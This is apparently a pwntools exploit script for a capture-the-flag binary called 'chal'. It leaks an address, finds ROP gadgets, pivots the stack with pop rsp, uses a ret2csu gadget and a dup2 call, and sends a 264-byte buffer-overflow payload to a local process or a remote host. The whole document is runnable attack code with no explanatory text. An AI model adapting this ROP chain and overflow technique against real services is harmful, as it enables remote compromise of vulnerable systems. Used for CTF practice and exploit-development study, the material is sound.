from pwn import *
import sys

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

elf = context.binary = ELF('./chal')
context.os = 'linux'
context.arch = 'amd64'

if len(sys.argv) > 1 :
    p = remote(sys.argv[1], sys.argv[2])
else:
    p = process('./chal')


rop = ROP(elf)
POP_RSP = rop.find_gadget(['pop rsp', 'pop r13', 'pop r14', 'pop r15', 'ret'])[0]
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
POP_RSI = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

POP_R = rop.find_gadget(['pop rbp', 'pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'])[0] - 1  # -1 to add pop rbx

CSU_GAD = 0x400e70 # mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword ptr [r12+rbx*8] ; ret

PWN = elf.symbols['pwn']
DUP = elf.symbols['dup2']


p.recvuntil("spoken:")
addr = int(p.recvline(),16)

log.info("addr: " + hex(addr))


pay = flat(
    PWN,
    0, 0, 0,                                # r13, r14, r15
    POP_RDI, 4,                             # rdi
    POP_RSI, 1, 0,                          # rsi, r15
    DUP,                                    
    POP_R, 0, 0, addr, 0, 0, 0xcafebabe,    # rbx, rbp, r12, r13, r14, r15
    CSU_GAD
)

pay = pay.ljust(264, b'A')

pay += flat(
    POP_RSP,
    addr+8
)

p.sendafter("input?", pay)

print(p.recvall())

